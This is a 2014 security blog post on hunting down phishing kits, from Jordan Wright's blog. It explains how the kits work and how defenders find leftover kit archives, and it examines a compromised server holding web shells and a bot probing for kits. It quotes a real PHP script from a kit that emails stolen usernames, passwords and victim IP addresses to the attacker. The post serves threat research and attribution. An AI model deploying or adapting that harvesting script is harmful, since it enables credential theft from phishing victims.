@@ -1,0 +1,415 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>How to Hunt Down Phishing Kits - jordan-wright</title>
+  <meta name="author" content="Jordan">
+
+  
+  <meta name="description" content="Introduction Sites like phishtank and clean-mx act as crowdsourced phishing detection and validation. By knowing how to look, you can consistently &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="jordan-wright" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="/stylesheets/blog.css" rel="stylesheet" media="screen, projection" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-44718701-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">jordan-wright</a></h1>
+  
+    <h2>Security and Programming Blog</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:jordan-wright.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/contact">Contact</a></li>
+  <li><a href="/projects">Projects</a></li>
+  <li><a href="/blog">Blog</a></li>
+  <li><a href="http://raidersec.blogspot.com">Raidersec</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">How to Hunt Down Phishing Kits</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-30T22:12:00-05:00" pubdate data-updated="true">Jul 30<span>th</span>, 2014</time>
+        
+           | <a href="#disqus_thread"
+             data-disqus-identifier="http://jordan-wright.github.io">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><img src="/images/headers/phishing_kit.png"/></p>
+
+<h3>Introduction</h3>
+
+<p>Sites like <a href="http://www.phishtank.com/phish_archive.php">phishtank</a> and <a href="http://support.clean-mx.com/clean-mx/phishing.php">clean-mx</a> act as crowdsourced phishing detection and validation. By knowing how to look, you can consistently find <a href="http://jordan-wright.github.io/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/">interesting information</a> about how attackers work, and the tools they use to conduct phishing campaigns. This post will give an example of how <em>phishing kits</em> are used, how to find them, as well as show a case study into other tools attackers use to maintain access to compromised servers.</p>
+
+<!-- more -->
+
+
+<h3>How Phishing Kits Work</h3>
+
+<p>To perform a phishing attack, attackers commonly employ prebuilt <em>phishing kits</em>. These kits come as a zip archive containing the HTML source code of the site they are spoofing, as well as accompanying PHP scripts that capture and process the phished credentials. Once credentials are submitted from a victim, they are passed to a script that looks similar to this (real) example:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;&quot;</span><span class="p">){</span>
+</span><span class='line'>        <span class="nx">header</span><span class="p">(</span><span class="s2">&quot;Location:file_doc.php&quot;</span><span class="p">);</span>
+</span><span class='line'>        <span class="k">exit</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="nb">session_destroy</span><span class="p">();</span>
+</span><span class='line'><span class="nv">$username</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">];</span>
+</span><span class='line'><span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">];</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$ip</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;REMOTE_ADDR&quot;</span><span class="p">);</span>
+</span><span class='line'><span class="nv">$country</span> <span class="o">=</span> <span class="nx">visitor_country</span><span class="p">();</span>
+</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;-------Moded by Ghost Wir3 ----------</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Username: &quot;</span><span class="o">.</span><span class="nv">$username</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Password : &quot;</span><span class="o">.</span><span class="nv">$password</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;IP: &quot;</span><span class="o">.</span><span class="nv">$ip</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$message</span> <span class="o">.=</span> <span class="s2">&quot;Country: &quot;</span><span class="o">.</span><span class="nv">$country</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$recipient</span> <span class="o">=</span> <span class="s2">&quot;[redacted]@gmail.com&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$subject</span> <span class="o">=</span> <span class="s2">&quot;Ghost Wir3 - &quot;</span><span class="o">.</span><span class="nv">$country</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$headers</span> <span class="o">=</span> <span class="s2">&quot;From:  Ghost Wir3 &lt;no_reply@mail.com&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$headers</span> <span class="o">.=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;eMailAdd&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'><span class="nv">$headers</span> <span class="o">.=</span> <span class="s2">&quot;MIME-Version: 1.0</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'><span class="nv">$arr</span> <span class="o">=</span> <span class="nx">country_sort</span><span class="p">();</span>
+</span><span class='line'><span class="k">foreach</span> <span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$recipient</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>        <span class="nb">mail</span><span class="p">(</span><span class="nv">$recipient</span><span class="p">,</span><span class="nv">$subject</span><span class="p">,</span><span class="nv">$message</span><span class="p">,</span><span class="nv">$headers</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In this example, to reuse the phishing kit, an attacker simply needs to change the <code>$recipient</code> variable to point to their address. In addition to this, if we as defenders are able to pull this PHP code, we can quickly identify the threat actor (in this case, [redacted]@gmail.com).</p>
+
+<h3>How to Find Phishing Kits</h3>
+
+<p>We&rsquo;ve seen that these kits generally require the credentials to be processed by server-side code. Unless there is a misconfiguration on the server, we will not be able to view this code, only that credentials are being passed to it.</p>
+
+<p>However, with that being said, <em>many attackers are <strong>lazy</strong></em>. I&rsquo;ve seen from experience that the original zip file containing the phishing kit is often left on the server, and can be downloaded to reveal the server-side source code. Additionally, the directories hosting the phishing kits often have indexing enabled, making it easier for us to see the files in the directory. This same technique has also <a href="https://www.usenix.org/legacy/events/woot08/tech/full_papers/cova/cova.pdf">been used previously by researchers</a> with success.</p>
+
+<p><img src="/images/blog/phish_kits/directory_index.png"/></p>
+
+<p>Knowing this, we can send requests for common archive extensions automatically in the hopes of finding the original phishing kits. These extensions include things such as .zip, .tar, .tar.gz, and .rar. For example, if the URL found by phishtank or clean-mx is <a href="http://x.x.x.x/apple/index.php,">http://x.x.x.x/apple/index.php,</a> we could send requests for <a href="http://x.x.x.x/apple.zip">http://x.x.x.x/apple.zip</a> with success in many cases.</p>
+
+<p>In some cases, finding the original phishing kit can reveal even more information about the tools and techniques used by attackers. Here&rsquo;s an example of one of those cases.</p>
+
+<h3>A Look into a Compromised Website</h3>
+
+<p>While performing random checks on many of the sites listed on phishtank and clean-mx, I came across one site that had a phishing kit located in the /phpmyadmin directory. When checking the files in the phishing kit, I found reference to a c100.php web shell. Sure enough, this file was still in place on the server:</p>
+
+<p><img src="/images/blog/phish_kits/c100.png" /></p>
+
+<p>PHP backdoors provide substantial access to attackers, facilitating further attacks and control over the compromised server. The c100.php and c99.php backdoors are among the most popular backdoors used by attackers. Through some Googling, we can see that there are <strong>tons</strong> of servers that are compromised using <a href="https://www.google.com/search?q=inurl%3A%22c99.php%22%22AND+filetype%3Aphp+%22!C99Shell%22+AND+%22Software%22">these</a> <a href="https://www.google.com/search?q=inurl%3A%22c100.php%22%22AND+filetype%3Aphp+%22%21C100%22+AND+%22Software%22">shells</a>.</p>
+
+<p>This shell revealed additional scripts (and other webshells) used by the attacker, including (but certainly not limited to!) the following:</p>
+
+<ul>
+<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-valider-php">valider.php</a> &ndash; The credential caching script</li>
+<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wpbrute-php">wpbrute.php</a> &ndash; A Wordpress brute forcing script</li>
+<li><a href="https://gist.github.com/jordan-wright/966cea37b8c01c360a2a#file-wso-php">wso.php</a> &ndash; Another web shell</li>
+</ul>
+
+
+<h3>Fellow Phish Hunters</h3>
+
+<p>In the process of pulling down additional scripts used by the attacker, I ran across the site access logs. Looking through this log, I could see the details of what files the attacker was accessing on the server, as well as determine that these files were in place as early as July 27, 2014. In addition to this, I found the following snippet:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">44</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/tardis.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">428</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">44</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/tardis.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/paypal.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/wellsfargo.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">439</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/chase.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/boa.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">432</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/update.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">435</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/pp.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">431</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/wells.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">45</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/remax.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">434</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">46</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/paypal.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">439</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">46</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/us.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">431</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">47</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/www.paypal.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">443</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span><span class='line'><span class="p">[</span><span class="mi">29</span><span class="o">/</span><span class="nx">Jul</span><span class="o">/</span><span class="mi">2014</span><span class="o">:</span><span class="mo">02</span><span class="o">:</span><span class="mi">59</span><span class="o">:</span><span class="mi">47</span> <span class="o">+</span><span class="mo">0100</span><span class="p">]</span> <span class="s2">&quot;GET /phpmyadmin/paypal/bankofamerica.com.zip HTTP/1.1&quot;</span> <span class="mi">404</span> <span class="mi">446</span> <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Java/1.7.0_45&quot;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can see that someone has a Java bot that is performing the same technique I described above, by automatically sending requests for common phishing kits. In fact, this and another bot submitted a <strong>substantial</strong> number of requests for common files to be found on phishing kits. I&rsquo;ll likely parse these out and make another blog post with the full list for those interested.</p>
+
+<h3>Conclusion</h3>
+
+<p>Hopefully this post not only shows a few of the interesting pieces of information we can find when investigating servers used for phishing campaigns, but also that there is still an incredible amount of work to be done in identifying threat actors behind phishing campaigns. As always, let me know if you have any questions or comments below!</p>
+
+<p>-Jordan</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Jordan</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-07-30T22:12:00-05:00" pubdate data-updated="true">Jul 30<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/kits/'>kits</a>, <a class='category' href='/blog/categories/phishing/'>phishing</a>, <a class='category' href='/blog/categories/phishing/'>phishing,</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits/" data-via="" data-counturl="http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits/" >Tweet</a>
+  
+  
+  <div class="g-plusone" data-size="medium"></div>
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/" title="Previous Post: A Look at Comment Spam Generator Scripts">&laquo; A Look at Comment Spam Generator Scripts</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/07/30/how-to-hunt-down-phishing-kits/">How to Hunt Down Phishing Kits</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/04/04/a-look-at-comment-spam-generator-scripts/">A Look at Comment Spam Generator Scripts</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/01/03/building-gophish-how-to-send-email-with-go/">Building GoPhish - How to Send Email With Go</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/29/building-gophish-day-1/">Building Gophish - Day 1</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/">Wireless Attacks With Python: Part One - the "Dnspwn Attack"</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Jordan -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'jordan-wright';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits/';
+        var disqus_url = 'http://jordan-wright.github.io/blog/2014/07/30/how-to-hunt-down-phishing-kits/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+  <script type="text/javascript">
+    (function() {
+      var script = document.createElement('script'); script.type = 'text/javascript'; script.async = true;
+      script.src = 'https://apis.google.com/js/plusone.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(script, s);
+    })();
+  </script>
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
